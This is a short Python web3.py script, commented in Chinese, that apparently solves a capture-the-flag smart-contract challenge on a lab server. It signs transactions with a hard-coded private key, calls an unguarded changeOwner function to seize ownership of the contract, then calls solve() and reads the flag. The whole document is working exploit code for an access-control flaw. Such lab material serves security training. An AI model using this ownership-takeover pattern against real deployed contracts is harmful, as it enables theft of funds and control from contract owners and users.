from web3 import Web3

# 1. 連線至以太坊節點
rpc_url = "http://chatelaine.cylabacademy.net:12117"
w3 = Web3(Web3.HTTPProvider(rpc_url))

# 2. 填入你的私鑰與目標合約地址
private_key = "0x96ae7572475014bbbb58f53b72d06d765dc678d7c5ecc621f1c4f8b8d7985e9b"
contract_address = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"

account = w3.eth.account.from_key(private_key)
my_address = account.address

# 3. 合約 ABI
abi = [
    {
        "inputs": [
            {"internalType": "address", "name": "_newOwner", "type": "address"}
        ],
        "name": "changeOwner",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "solve",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "revealed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

contract = w3.eth.contract(address=contract_address, abi=abi)

print(f"操作帳戶: {my_address}")

# 步驟一：呼叫 changeOwner 將自己設為 owner
print("正在將合約擁有者更改為自己...")
nonce = w3.eth.get_transaction_count(my_address)
tx = contract.functions.changeOwner(my_address).build_transaction(
    {
        "from": my_address,
        "gas": 200000,
        "gasPrice": w3.eth.gas_price,
        "nonce": nonce,
    }
)
signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash)
print("擁有者變更成功！")

# 步驟二：呼叫 solve() 通過檢查並解鎖 Flag
print("正在呼叫 solve() 解鎖 Flag...")
nonce = w3.eth.get_transaction_count(my_address)
tx2 = contract.functions.solve().build_transaction(
    {
        "from": my_address,
        "gas": 200000,
        "gasPrice": w3.eth.gas_price,
        "nonce": nonce,
    }
)
signed_tx2 = w3.eth.account.sign_transaction(tx2, private_key=private_key)
tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash2)
print("solve() 執行成功！")

# 步驟三：取得 Flag
if contract.functions.revealed().call():
  flag = contract.functions.getFlag().call()
  print(f"成功取得 Flag: {flag}")
else:
  print("尚未解鎖，請檢查交易。")
